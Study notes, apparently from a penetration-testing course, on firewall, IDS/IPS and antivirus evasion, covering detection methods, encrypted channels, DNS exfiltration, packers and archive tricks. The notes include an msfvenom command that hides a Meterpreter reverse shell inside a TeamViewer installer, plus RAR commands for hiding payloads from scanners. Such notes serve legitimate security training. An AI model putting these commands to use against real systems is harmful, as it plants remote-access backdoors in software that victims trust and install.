# Summary: Firewall, IDS/IPS, and Antivirus Evasion

## 🛡️ Target Defenses & Security Policies
- **Endpoint Protection:** Localized software/devices protecting a single host (Antivirus, Antimalware, Host Firewall, Anti-DDoS).
- **Perimeter Protection:** Edge devices regulating traffic between public (Internet) and private networks, including **DMZs** (De-Militarized Zones) for public-facing servers.
- **Detection Mechanisms:**
  - **Signature-based Detection:** Matches network packets or file hashes against known attack patterns.
  - **Heuristic / Statistical Anomaly Detection:** Compares behavior against an established baseline for unusual deviations.
  - **Stateful Protocol Analysis:** Compares traffic against pre-built profiles of non-malicious protocol definitions.
  - **Live-Monitoring (SOC):** Analysts or automated systems monitoring live network feeds.

---

## 🔍 Evasion & Obfuscation Techniques

### 1. Network & Transport Evasion
- **AES Encryption:** Modern Metasploit (`msf6`) features AES-encrypted communication channels for Meterpreter shells, bypassing simple network-based pattern inspections.
- **Alternative Protocols / Exfiltration:** Utilizing allowed services (e.g., DNS exfiltration) to siphon data or establish persistence when strict traffic rules apply.

### 2. File-Based & Payload Evasion (MSFVenom Templates)
- **Backdoored Executables (`-k` flag):** Embedding shellcode inside legitimate installers or applications (e.g., TeamViewer) so the payload runs in a separate thread without disrupting normal application behavior.
- **Double Archiving / Password Protection:** Encrypting archives (e.g., RAR, ZIP) with passwords multiple times hides file contents from automated AV scanners (though it may trigger administrative alerts due to unreadable password-locked files).
- **Packers:** Compressing executables together with decompression stubs into a single file to alter file structures and evade static signatures. Popular packers include **UPX**, **The Enigma Protector**, **MPRESS**, and **Themida**.

---

## 💻 Practical Commands & References

### Embedding Payloads into Executable Templates
```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
````

### Checking Payloads against VirusTotal

Bash

```
msf-virustotal -k <API key> -f test.js
```

### Multi-Layer Archiving for Evasion (Linux RAR utility)

Bash

```
rar a ~/test.rar -p ~/test.js
mv test.rar test
rar a test2.rar -p test
mv test2.rar test2
```